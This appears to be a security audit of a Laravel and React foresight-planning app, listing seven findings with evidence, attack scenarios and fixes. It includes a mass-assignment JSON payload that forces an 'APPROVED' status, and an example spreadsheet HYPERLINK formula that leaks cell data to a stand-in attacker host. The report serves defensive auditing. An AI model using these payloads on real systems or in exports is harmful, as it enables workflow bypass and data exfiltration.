# Foresight Radar — Comprehensive Security Audit (`SECURITY_AUDIT.md`)

**Audit Date:** 2026-10-23  
**Repository:** `https://github.com/roozylabs27/foresight-radar`  
**Audited Branch / Commit:** `development` (`83f532a`)  
**Stack Baseline:** Laravel 11.57.0 (PHP 8.3.36), Spatie Laravel Permission 6.24, React 19.3.1, Inertia.js 2.3.29  
**Audit Methodology:** OWASP ASVS v4.0 / OWASP Top 10 (2021) Static & Runtime Configuration Analysis

---

## 1. Executive Summary & Security Posture Overview

Foresight Radar demonstrates strong foundational security controls in several areas:
- **Authentication & Brute-Force Protection:** `LoginRequest` enforces IP+email rate limiting (`5 attempts`) with `RateLimiter` and regenerates session IDs on login (`AuthenticatedSessionController::store`).
- **Route-Level RBAC:** Every authenticated web and JSON route in `routes/web.php` is guarded by Spatie `permission:*` middleware (`bootstrap/app.php` registers `role`, `permission`, and `role_or_permission` middleware aliases).
- **Resource Policies on Core Entities:** `DrivingForcePolicy`, `ScenarioPolicy`, and `UserPolicy` protect update/delete mutations on `DrivingForceController`, `ScenarioController`, and `UserController`, and `UserRequest` blocks non-super-admins from assigning `super-admin` or `developer` roles.
- **XSS & SQL Injection Defenses:** Zero occurrences of `dangerouslySetInnerHTML`, `eval()`, or unescaped Blade `{!! !!}` with user input; `TableSort` strictly whitelists sortable column names and normalizes directions to `asc`/`desc`.
- **LLM Prompt & Secret Hygiene:** `AnthropicStructuredClient` and `OpenAiCompatibleClient` never log API keys or prompt/document text, and `LlmSignalExtractor` maps driving forces to opaque `F1..Fn` references rather than database IDs.

However, our deep-dive audit identified **2 High-severity**, **3 Medium-severity**, and **2 Low-severity** security vulnerabilities that require remediation:

| ID | Severity | Confidence | Title | OWASP Category |
|---|---|---|---|---|
| `SEC-001` | **High** | Confirmed | Mass Assignment & Audit Attribution Spoofing on Driving Force Creation/Update Allows Approval Workflow Bypass | A01:2021 Broken Access Control / A04:2021 Insecure Design |
| `SEC-002` | **High** | Confirmed | Supply Chain Vulnerabilities in Client-Side SheetJS (`xlsx`) & Laravel 11 Advisories | A06:2021 Vulnerable and Outdated Components |
| `SEC-003` | **Medium** | Confirmed | Missing Object Ownership Check on Source Extraction Polling & Missing Lifecycle Preconditions on Stage Controllers | A01:2021 Broken Access Control (BOLA) |
| `SEC-004` | **Medium** | Confirmed | Unrestricted Public Account Self-Registration Enabled by Default (`POST /register`) | A07:2021 Identification and Authentication Failures |
| `SEC-005` | **Medium** | Confirmed | Direct Role-to-User Permission Duplication (`syncPermissions`) Prevents Role-Based Permission Revocation | A01:2021 Broken Access Control |
| `SEC-006` | **Low** | Confirmed | Spreadsheet Formula Injection (CSV/XLSX DDE) Risk in Client-Side Registered List Export | A03:2021 Injection |
| `SEC-007` | **Low** | Confirmed | Missing Rate Limiting on Core CRUD/Fetch Endpoints & Over-Serialization of `auth.user` in Inertia Shared Props | A04:2021 Insecure Design / A05:2021 Security Misconfiguration |

---

## 2. Detailed Security Findings

### `SEC-001` — Mass Assignment & Audit Attribution Spoofing on Driving Force Creation/Update Allows Approval Workflow Bypass

- **ID:** `SEC-001`
- **Category:** `Security` / `API`
- **Title:** Mass Assignment & Audit Attribution Spoofing on Driving Force Creation and Update Allows Approval Workflow Bypass
- **Severity:** `High`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `app/Http/Controllers/DrivingForceController.php` lines 60–81 (`create`) and lines 90–106 (`update`)
  - `app/Models/DrivingForce.php` lines 19–31 (`$fillable`)
  - `app/Http/Requests/DrivingForceRequest.php` lines 24–41
- **Evidence:**
  ```php
  // app/Models/DrivingForce.php:19-31
  protected $fillable = [
      'uuid', 'dimension_id', 'pic', 'created_by', 'updated_by',
      'keyword', 'description', 'status', 'remark', 'approved_at', 'closed_at',
  ];
  ```
  ```php
  // app/Http/Controllers/DrivingForceController.php:63-70
  $request = $request->all();
  $request['uuid'] = Uuid::uuid4();
  $request['pic'] = $request['pic_id'];
  $request['created_by'] = auth()->id();

  $driving_force = DrivingForce::create($request);
  ```
  ```php
  // app/Http/Controllers/DrivingForceController.php:93-100
  $request = $request->all();
  $driving_force->keyword = $request['keyword'];
  $driving_force->dimension_id = $request['dimension_id'];
  $driving_force->updated_by = $request['updated_by'] ?? null;
  $driving_force->pic = $request['pic_id'];
  $driving_force->description = $request['description'];
  $driving_force->save();
  ```
- **Failure or Attack Scenario:**
  1. **Governance & Approval Bypass on Create:** A low-privilege user who has `create-driving-force` (e.g., an analyst or division member) but does **not** have `approve-approval-items` sends a `POST /driving-force/create` request containing:
     ```json
     {
       "keyword": "Unauthorized Strategic Shift",
       "description": "This description has at least twenty words to satisfy the validation rule for creating a driving force in the system.",
       "dimension_id": 1,
       "pic_id": 2,
       "status": "APPROVED",
       "approved_at": "2026-10-23 10:00:00"
     }
     ```
     Because `DrivingForceController::create()` uses `$request->all()` instead of `$request->validated()`, Eloquent mass-assigns `status = 'APPROVED'` and `approved_at`, completely bypassing the 5-stage evaluation pipeline and `ApprovalController` RBAC gate.
  2. **Audit Log Spoofing on Update:** In `DrivingForceController::update()`, `$driving_force->updated_by` is populated from `$request['updated_by'] ?? null` instead of `auth()->id()`. Any user updating a driving force either wipes `updated_by` to `null` (default UI behavior) or spoofs another user's ID (`"updated_by": 1`).
- **Root Cause:** Calling `$request->all()` instead of `$request->validated()`, exposing privileged lifecycle columns (`status`, `approved_at`, `closed_at`, `created_by`, `updated_by`) in `DrivingForce::$fillable`, and trusting client input for `updated_by`.
- **Impact:**
  - **Security & Business Impact:** Complete bypass of the executive approval gate (`approve-approval-items`) during creation and falsification of `updated_by` audit trails.
  - **Likelihood:** High (exploitable with a single authenticated HTTP request).
- **Reproduction or Validation Method:**
  In a PHPUnit feature test, authenticate as a user with only `create-driving-force` permission, `POST /driving-force/create` with `"status" => "APPROVED"`, and assert `assertDatabaseHas('driving_forces', ['status' => 'PENDING'])` — this assertion currently **fails** because `status` is saved as `'APPROVED'`.
- **Recommended Remediation:**
  1. In `DrivingForceController::create()`, use `$validated = $request->validated();` and explicitly construct the attribute array with `'status' => DrivingForceStatus::PENDING->value` and `'created_by' => auth()->id()`.
  2. In `DrivingForceController::update()`, use `$validated = $request->validated();` and set `$driving_force->updated_by = auth()->id();`.
  3. Remove `'status'`, `'approved_at'`, `'closed_at'`, `'created_by'`, and `'updated_by'` from `DrivingForce::$fillable` (or assign them explicitly where needed).
- **Required Tests:**
  - Feature test verifying that `POST /driving-force/create` with injected `status: "APPROVED"`, `approved_at`, and `created_by` ignores those fields and persists `status = 'PENDING'` and `created_by = auth()->id()`.
  - Feature test verifying that `PATCH /driving-force/{uuid}` with injected `updated_by` always sets `updated_by = auth()->id()`.
- **Dependencies and Effort:** None | Effort: `XS`

---

### `SEC-002` — Known High-Severity Supply Chain Vulnerabilities in `xlsx` (SheetJS) & Laravel 11 Framework Advisories

- **ID:** `SEC-002`
- **Category:** `Security` / `Frontend` / `Backend`
- **Title:** Known High-Severity Vulnerabilities in Client-Side SheetJS (`xlsx`) & Laravel 11 Framework Advisories
- **Severity:** `High`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `package.json` line 48 (`"xlsx": "^0.18.5"`)
  - `resources/js/Components/OverallStatus.jsx` line 5
  - `composer.json` line 12 (`"laravel/framework": "^11.0"`, locked at `v11.57.0`)
- **Evidence:**
  1. **NPM Audit (`npm audit`):**
     - `xlsx@0.18.5` (High): Prototype Pollution (`GHSA-4r6h-8v6p-xvw6`) and Regular Expression Denial of Service (`GHSA-5pgg-2g8v-p4x9`), with `fixAvailable: false` on the public npm registry.
     - `@vitejs/plugin-react` / `vite` (High/Moderate dev-only advisories).
  2. **Composer Audit (`docker exec laravel_app composer audit --format=json`):**
     - `CVE-2026-102279` (`GHSA-jh5r-qr3c-85q8`): Laravel XSS in Debug Page Information (`<12.69.0`).
     - `PKSA-m5cs-t1y6-qpcs` (`GHSA-crmm-hgp2-wgrp`): Laravel Temporary Signed URL Path Confusion (`<12.61.1`).
     - `CVE-2026-48019` (`GHSA-5vg9-5847-vvmq`): Laravel CRLF injection in default `email` validation rule (`<12.60.0`).
- **Failure or Attack Scenario:**
  - While `xlsx` is currently only used for *writing* workbooks in `OverallStatus.jsx`, keeping an unmaintained package with unpatched prototype pollution in `package.json` exposes any future spreadsheet import feature and causes `npm audit --audit-level=high` to fail.
  - For Laravel 11.57.0, the default `'email'` validation rule in `UserRequest` (lines 43, 51), `LoginRequest`, and `ProfileUpdateRequest` uses `email` (RFC validation mode) rather than `email:rfc,strict` or regex filtering, which is the vector described in `CVE-2026-48019`.
- **Root Cause:** Upstream npm abandonment of `xlsx@0.18.5` and Laravel 11 reaching upstream security-patch cutoff relative to Laravel 12.69+.
- **Impact:**
  - **Security Impact:** Supply-chain exposure (`xlsx`) and potential CRLF injection in email headers if unstrict `email` validation rules are passed to mail headers (`CVE-2026-48019`).
  - **Likelihood:** Medium (mitigated in production when `APP_DEBUG=false` and signed URLs are not used, except for `'email'` rule usage).
- **Reproduction or Validation Method:**
  Run `npm audit` and `docker exec laravel_app composer audit --format=json`.
- **Recommended Remediation:**
  1. Replace client-side `xlsx` in `OverallStatus.jsx` with either a lightweight maintained library (`exceljs` / `write-excel-file` dynamically imported) or a server-side streamed `.xlsx`/`.csv` download endpoint, and remove `"xlsx"` from `package.json`.
  2. Harden email validation rules in `UserRequest`, `LoginRequest`, `RegisteredUserController`, and `PasswordResetLinkController` by adding `'max:255'` and `'not_regex:/[\r\n]/'` (or `'email:rfc,strict'`) to mitigate `CVE-2026-48019` on Laravel 11, or plan a minor framework bump to Laravel 12 (`^12.69`).
- **Required Tests:**
  - Test rejecting email addresses containing `\r` or `\n` characters on login, registration, and user creation.
  - Verify `npm audit --omit=dev` reports `0` high/critical vulnerabilities after removing `xlsx`.
- **Dependencies and Effort:** Coordinate with `PERF-005` and `SEC-006` | Effort: `M`

---

### `SEC-003` — Missing Object Ownership Check on Source Extraction Status & Missing Lifecycle Preconditions on Stage Controllers

- **ID:** `SEC-003`
- **Category:** `Security` / `API`
- **Title:** Missing Object Ownership Check on Source Extraction Polling & Missing Lifecycle Stage Preconditions on Rating/Horizon/Status Controllers
- **Severity:** `Medium`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `app/Http/Controllers/SignalIngestionController.php` lines 68–76 (`index`) vs lines 143–145 (`extraction`)
  - `app/Http/Controllers/TimeHorizonController.php` lines 55–80 (`update`)
  - `app/Http/Controllers/RatingUrgencyController.php` lines 48–75 (`update`)
  - `app/Http/Controllers/StatusActionController.php` lines 56–104 (`update`)
- **Evidence:**
  ```php
  // app/Http/Controllers/SignalIngestionController.php:68-71 (index scopes to creator)
  $pendingExtractions = Source::where('created_by', auth()->id())
      ->whereIn('extraction_status', [LlmJobStatus::QUEUED, LlmJobStatus::PROCESSING])
  ...
  // app/Http/Controllers/SignalIngestionController.php:143-145 (extraction has no ownership check)
  public function extraction(Source $source, SignalExtractionService $extractionService)
  {
      return response()->json($extractionService->statusPayload($source), Response::HTTP_OK);
  }
  ```
  And in `TimeHorizonController::update`, `RatingUrgencyController::update`, and `StatusActionController::update`:
  - Neither `DrivingForcePolicy::update` nor any status check (`$driving_force->status !== 'CLOSED'`) is enforced before mutating `DrivingForceRating` records.
- **Failure or Attack Scenario:**
  1. Any user with `view-signal` can query `GET /signals/sources/{uuid}/extraction` for another analyst's source UUID and read its title, extraction status, and error metadata.
  2. A user with `rate-rating-urgency`, `assign-time-horizon`, or `update-status-action` can directly `PATCH /rating-urgency/{uuid}`, `PATCH /time-horizon/{id}`, or `PATCH /status-action/{uuid}` on a `DrivingForce` that has already been `CLOSED` or `REJECTED`, mutating historical ratings of closed items behind the scenes.
- **Root Cause:** Missing object-level authorization (`$source->created_by === auth()->id() || auth()->user()->hasAnyRole(...)`) on `SignalIngestionController::extraction()` and missing lifecycle state guards on the stage controllers.
- **Impact:**
  - **Security & Data Integrity Impact:** Unauthorized modification of ratings on `CLOSED` driving forces and cross-analyst extraction status disclosure.
  - **Likelihood:** Medium.
- **Reproduction or Validation Method:**
  Create a `CLOSED` driving force in a feature test and send `PATCH /rating-urgency/{uuid}` with new impact/uncertainty scores; the controller currently returns `200 OK` and mutates the closed force's rating.
- **Recommended Remediation:**
  1. In `SignalIngestionController::extraction()`, verify `$source->created_by === auth()->id() || auth()->user()?->hasAnyRole(['developer', 'super-admin', 'admin'])` (or `abort(403)`).
  2. In `TimeHorizonController::update`, `RatingUrgencyController::update`, and `StatusActionController::update`, reject mutations when `$driving_force->status === DrivingForceStatus::CLOSED->value` (returning `409 Conflict` or `422 Unprocessable Entity`).
- **Required Tests:**
  - Feature tests asserting `403` when polling another non-admin user's `Source` extraction status and `409`/`422` when attempting to rate a `CLOSED` driving force.
- **Dependencies and Effort:** None | Effort: `S`

---

### `SEC-004` — Unrestricted Public Account Self-Registration Enabled by Default

- **ID:** `SEC-004`
- **Category:** `Security`
- **Title:** Unrestricted Public Account Self-Registration Enabled by Default (`GET/POST /register`)
- **Severity:** `Medium`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `routes/auth.php` lines 15–18
  - `app/Http/Controllers/Auth/RegisteredUserController.php` lines 31–51
  - `app/Http/Middleware/HandleInertiaRequests.php` line 39
- **Evidence:**
  ```php
  // routes/auth.php:15-18
  Route::get('register', [RegisteredUserController::class, 'create'])->name('register');
  Route::post('register', [RegisteredUserController::class, 'store']);
  ```
  `HandleInertiaRequests` exposes `'canRegister' => (bool) config('auth.allow_registration', true)`, defaulting to `true`, and `RegisteredUserController` does not check `config('auth.allow_registration')` at all!
- **Failure or Attack Scenario:**
  In an internal executive intelligence platform where users are provisioned by administrators via `/user-management` with specific division roles, any anonymous external user can POST to `/register` without rate limiting, create an authenticated account in `users` with **zero roles**, and trigger a **500 Internal Server Error** in `UserResource::toArray()` (`$this->roles[0]->display_name`, see `REL-002`) whenever a `developer` opens the User Management page!
- **Root Cause:** Leftover Laravel Breeze public registration routes without a server-side `config('auth.allow_registration', false)` guard or default role assignment.
- **Impact:**
  - **Security & Availability Impact:** Anonymous account creation spam and immediate DoS (`HTTP 500`) on the developer User Management view.
  - **Likelihood:** High if exposed to the network with default configuration.
- **Reproduction or Validation Method:**
  Send `POST /register` as a guest user, then authenticate as `developer` and call `GET /user-management/fetch-data` -> `500 Internal Server Error`.
- **Recommended Remediation:**
  1. Default `config('auth.allow_registration', false)` in `config/auth.php` and `.env.example`.
  2. Enforce `abort_unless((bool) config('auth.allow_registration', false), 403);` inside `RegisteredUserController::create()` and `store()`, and add `throttle:6,1` to `POST /register`.
- **Required Tests:**
  - Feature test verifying `GET /register` and `POST /register` return `403` when `auth.allow_registration` is `false`.
- **Dependencies and Effort:** Coordinate with `REL-002` | Effort: `XS`

---

### `SEC-005` — Direct Role-to-User Permission Duplication (`syncPermissions`) Prevents Role Permission Revocation

- **ID:** `SEC-005`
- **Category:** `Security` / `Maintainability`
- **Title:** Direct Role-to-User Permission Duplication (`syncPermissions`) Prevents Role-Based Permission Revocation
- **Severity:** `Medium`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `app/Http/Controllers/UserController.php` lines 67–69 (`create`) and lines 100–102 (`update`)
  - `database/seeders/UserSeeder.php` lines 109–113
- **Evidence:**
  ```php
  // app/Http/Controllers/UserController.php:67-69
  $get_role = Role::where('id', $request->role_id)->first();
  $new_user->syncRoles($get_role->name);
  $new_user->syncPermissions($get_role->permissions);
  ```
- **Failure or Attack Scenario:** Spatie Permission resolves `$user->can(...)` by checking both direct permissions (`model_has_permissions`) and role permissions (`role_has_permissions`). Because `UserController` copies all role permissions directly onto the user in `model_has_permissions`, revoking a permission from a `Role` in the future has **zero effect** on existing users assigned to that role — they retain the revoked permission indefinitely.
- **Root Cause:** Misuse of Spatie Permission API by calling `$user->syncPermissions($role->permissions)` alongside `$user->syncRoles($role->name)`, combined with `HandleInertiaRequests` line 50 fallback.
- **Impact:**
  - **Security Impact:** Privilege persistence after role permission revocation; polluted `model_has_permissions` table.
  - **Likelihood:** Confirmed across all seeded and UI-created users.
- **Reproduction or Validation Method:**
  Create a user with role `corporate_planning`, revoke a permission from `Role::findByName('corporate_planning')`, and check `$user->fresh()->can(...)` — it still returns `true` due to direct rows in `model_has_permissions`.
- **Recommended Remediation:**
  Since `HandleInertiaRequests` line 49 already uses `$user->getAllPermissions()->pluck('name')->toArray()` (which includes permissions inherited via roles), remove `$user->syncPermissions($get_role->permissions)` from `UserController::create()` and `UserController::update()` (or call `$user->syncPermissions([])` on role update to clear stale direct permissions).
- **Required Tests:**
  - Feature test verifying that updating a role's permissions or changing a user's role accurately reflects only the active role's permissions.
- **Dependencies and Effort:** None | Effort: `XS`

---

### `SEC-006` — Spreadsheet Formula Injection (CSV/XLSX DDE) Risk in Registered List Export

- **ID:** `SEC-006`
- **Category:** `Security` / `Frontend`
- **Title:** Spreadsheet Formula Injection (CSV/XLSX DDE Injection) Risk in Client-Side Registered List Export
- **Severity:** `Low`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `resources/js/Components/OverallStatus.jsx` lines 74–107 (`exportWorkbook`)
- **Evidence:**
  ```javascript
  // resources/js/Components/OverallStatus.jsx:75-90
  const rows = records.map((record, index) => ({
      No: index + 1,
      Dimension: record.dimension,
      Keyword: record.keyword,
      Description: record.description,
      ...
  }));
  const worksheet = XLSX.utils.json_to_sheet(rows);
  ```
- **Failure or Attack Scenario:** If an ingested external article or user input contains a title/description starting with `=`, `+`, `-`, or `@` (e.g., `=HYPERLINK("http://attacker.example/leak?d="&A1, "Click")`), exporting the Registered List to Excel writes raw strings that spreadsheet viewers may interpret or prompt as formulas.
- **Root Cause:** Lack of formula-prefix neutralization (`'`) on user/LLM-supplied text fields (`keyword`, `description`, `dimension`) before spreadsheet generation.
- **Impact:** Low (requires social engineering when opening the exported `.xlsx` file in desktop spreadsheet software).
- **Reproduction or Validation Method:** Inspect `exportWorkbook()` in `OverallStatus.jsx` — no sanitization helper is applied to string fields.
- **Recommended Remediation:** Prefix any string cell starting with `/^[=+\-@\t\r]/` with a leading single quote (`'`) before passing rows to the spreadsheet generator.
- **Required Tests:** Unit test for the spreadsheet cell sanitizer function.
- **Dependencies and Effort:** None | Effort: `XS`

---

### `SEC-007` — Missing Rate Limiting on Core CRUD/Fetch Endpoints & Over-Serialization of `auth.user` in Inertia Shared Props

- **ID:** `SEC-007`
- **Category:** `Security` / `API`
- **Title:** Missing Rate Limiting on Core CRUD/Fetch Endpoints & Over-Serialization of `auth.user` in Inertia Shared Props
- **Severity:** `Low`
- **Confidence:** `Confirmed`
- **Affected Location:**
  - `routes/web.php` lines 73–155
  - `app/Http/Middleware/HandleInertiaRequests.php` lines 35–53
- **Evidence:**
  1. In `routes/web.php`, `throttle` middleware is applied to `/visualization/*`, `/dashboard/simulate`, `/signals/ingest`, and `/scenarios/{scenario}/generate`, but omitted from `/driving-force/*`, `/signals/fetch`, `/signals/{signal}/review`, `/time-horizon/*`, `/rating-urgency/*`, `/status-action/*`, `/approval-items/*`, `/closed-items/*`, `/scenarios/fetch`, and `/user-management/*`.
  2. In `HandleInertiaRequests::share()`, `'user' => $user` serializes the full `User` model instance after `$user->roles` and `$user->getAllPermissions()` have been accessed, embedding full `roles` and `permissions` model arrays (including internal IDs, timestamps, and pivot objects) inside `props.auth.user` on every Inertia response.
- **Failure or Attack Scenario:**
  - Automated scraping or rapid mutation flooding against unthrottled endpoints (`/driving-force/fetch-data`, `/signals/fetch`, `/user-management/fetch-data`).
  - Unnecessary exposure of internal user primary keys (`id`), `deleted_at`, and Spatie pivot structures in HTML `data-page` attributes.
- **Root Cause:** Selective application of `throttle` middleware and passing the raw `$user` Eloquent model to Inertia shared props instead of `only(['uuid', 'name', 'email'])`.
- **Impact:** Low.
- **Reproduction or Validation Method:** Inspect `data-page` JSON on any authenticated Inertia page to observe `props.auth.user.roles` and `props.auth.user.id`.
- **Recommended Remediation:**
  1. Apply a baseline `throttle:120,1` middleware to the authenticated route group in `routes/web.php` (keeping stricter `throttle:10,1` / `throttle:30,1` on expensive LLM and simulation routes).
  2. Serialize only safe user fields in `HandleInertiaRequests::share()`: `'user' => $user->only(['id', 'uuid', 'name', 'email'])`.
- **Required Tests:** Feature test verifying Inertia shared `auth.user` contains `name` and `email` without leaking full Spatie pivot tables.
- **Dependencies and Effort:** None | Effort: `XS`

